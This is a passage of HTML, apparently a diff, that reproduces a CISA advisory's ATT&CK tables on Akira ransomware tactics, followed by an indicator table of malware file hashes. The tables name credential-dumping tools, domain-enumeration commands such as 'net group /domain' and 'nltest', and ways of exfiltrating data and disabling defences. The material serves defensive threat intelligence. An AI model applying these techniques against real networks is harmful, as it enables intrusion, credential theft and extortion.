+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors have used remote access services, such as RDP/VPN connection to gain initial access.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Phishing: Spearphishing Attachment </span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1566.001</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use phishing emails with malicious attachments to gain access to networks.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Phishing: Spearphishing Link </span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1566.002</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use phishing emails with malicious links to gain access to networks. </span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 7: Credential Access</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-8841">
+<caption><em>Table 7: Credential Access</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">OS Credential Dumping</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1003</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">
+<p>OS Credential Dumping:</p>
+<p>LSASS Memory</p>
+</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1003.001</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors attempt to access credential material stored in the process memory of the LSASS.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 8: Discovery</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-3462">
+<caption><em>Table 8: Discovery</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">System Network Configuration Discovery </span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1016</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use tools to scan systems and identify services running on remote hosts and local network infrastructure.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">System Information Discovery</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1082</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use tools like PCHunter64 to acquire detailed process and system information.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Domain Trust Discovery</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1482</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use the net Windows command to enumerate domain information.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Process Discovery</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1057</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use the <code>Tasklist</code> utility to obtain details on running processes via PowerShell.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Permission Groups Discovery: Local Groups</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1069.001</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use the <code>net localgroup /dom</code> to find local system groups and permission settings.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Permission Groups Discovery: Domain Groups </span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1069.002</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use the <code>net group /domain</code> command to attempt to find domain level groups and permission settings.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Remote System Discovery</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1018</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use <code>nltest / dclist</code> to amass a listing of other systems by IP address, hostname, or other logical identifiers on a network.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 9: Persistence</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-2851">
+<caption><em>Table 9: Persistence</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Create Account: Domain Account</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1136.002</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 10: Defense Evasion</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-3216">
+<caption><em>Table 10: Defense Evasion</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Impair Defenses: Disable or Modify Tools</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1562.001</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use BYOVD attacks to disable antivirus software.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 11: Command and Control</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-9189">
+<caption><em>Table 11: Command and Control</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Remote Access Software</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1219</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Proxy</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1090</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors utilized Ngrok to create a secure tunnel to servers that aided in exfiltration of data. </span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 12: Collection</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-5160">
+<caption><em>Table 12: Collection</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Archive Collected Data: Archive via Utility</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1560.001</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use tools like WinRAR to compress files.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 13: Exfiltration</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-9364">
+<caption><em>Table 13: Exfiltration</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Exfiltration Over Alternative Protocol</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1048</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use file transfer tools like WinSCP to transfer data.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Transfer Data to Cloud Account</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1537</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use tools like CloudZilla to exfiltrate data to a cloud account and connect to exfil servers they control.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Exfiltration Over Web Service: Exfiltration to Cloud Storage</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1567.002</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors leveraged RClone to sync files with cloud storage services to exfiltrate data. </span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 14: Impact</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-843">
+<caption><em>Table 14: Impact</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Date Encrypted for Impact</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1486</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors encrypt data on target systems to interrupt availability to system and network resources.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Inhibit System Recovery</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1490</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors delete volume shadow copies on Windows systems.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Financial Theft</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1657</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors use a double-extortion model for financial gain.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table cellpadding="0" cellspacing="0" class="gstl_50 gssb_c" role="presentation" style="width: 334px; display: none; top: 207px; left: 781px; position: absolute;"><tbody><tr><td class="gssb_f"></td><td class="gssb_e" style="width: 100%;"></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table cellpadding="0" cellspacing="0" class="gstl_51 gssb_c" role="presentation" style="width: 2px; display: none; top: 3px; left: -1px; position: absolute;"><tbody><tr><td class="gssb_f"></td><td class="gssb_e" style="width: 100%;"></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table _ngcontent-kpx-c114=""><thead _ngcontent-kpx-c167=""><tr _ngcontent-kpx-c167=""><!-- --><th _ngcontent-kpx-c167="" class="clickable ng-star-inserted" style="width: 115px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">type</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="clickable ng-star-inserted" style="width: 470px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">indicator</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 150px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">Role</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 30%;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">title</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 150px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">Added</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="clickable text-center hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 70px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">Active</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><div _ngcontent-kpx-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-kpx-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 60px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable">related Pulses</div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted" style="width: 235px;"><div _ngcontent-kpx-c167="" class="column-header-container"><div _ngcontent-kpx-c167="" class="clickable"></div><otx-table-sort-icon _ngcontent-kpx-c167="" _nghost-kpx-c112=""><!-- --></otx-table-sort-icon></div></th><!-- --><!-- --></tr></thead><!-- --><tbody _ngcontent-kpx-c167=""><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="68729b85aa01cd8c9f4ccd137ddde137">68729b85aa01cd8c9f4ccd137ddde137</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">34</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="e148dee0132f5d20c01fbb4a3fc87b47">e148dee0132f5d20c01fbb4a3fc87b47</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">34</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="42d0574f4405bd7d2b154d321d345acb18834a41">42d0574f4405bd7d2b154d321d345acb18834a41</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">6</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="960b01ab967e96fd6d875eb157667e8ef7ff1c4a">960b01ab967e96fd6d875eb157667e8ef7ff1c4a</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">34</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="b70b0784e43404f66a282231c65723aa66c63891">b70b0784e43404f66a282231c65723aa66c63891</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- 